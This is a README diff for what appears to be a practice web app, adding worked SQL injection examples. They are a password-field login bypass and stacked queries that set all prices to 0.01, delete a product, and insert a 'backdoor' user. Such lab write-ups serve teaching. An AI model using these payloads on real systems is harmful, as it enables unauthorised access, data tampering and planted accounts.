@@ -74,10 +74,25 @@ Enables database manipulation through INSERT statements
 
 ## Injections and Vulnerabilities Example
 ### 1. OR-Based Login Bypass
+In the login page enter the attack in the password field, and anything for the username.
 Attack: ' OR '1'='1' #
-Result: Makes the WHERE clause always true
 SELECT * FROM users WHERE username = '' OR '1'='1' # ' AND password
 <img width="1876" height="937" alt="image" src="https://github.com/user-attachments/assets/ed807ccf-b47e-4b59-8f52-2c380919ab9c" />
 
 <img width="1846" height="772" alt="image" src="https://github.com/user-attachments/assets/27fc5a2b-2085-4080-8993-e3f7131ed52f" />
+In the password field, I entered the SQL injection statement, and logged in as a username that is gibberish, and not in the database. 
 
+
+### 2. Update all Prices to specific amount ($0.01)
+In the products page, enter the attack. 
+Attack: x', 0); UPDATE products SET price = 0.01; #
+Price: 0
+
+### 3. Delete specific product
+In the products page, you can delete a product by name.
+Attack: *x', 0); DELETE FROM products WHERE name = 'Laptop'; #
+Price: 0
+
+### 4.  Insert malicious user
+Through the add products page, you can enter a statement to insert a user into the table.
+Attack: Test', 0); INSERT INTO users (username, password) VALUES ('backdoor', 'secret'); # 
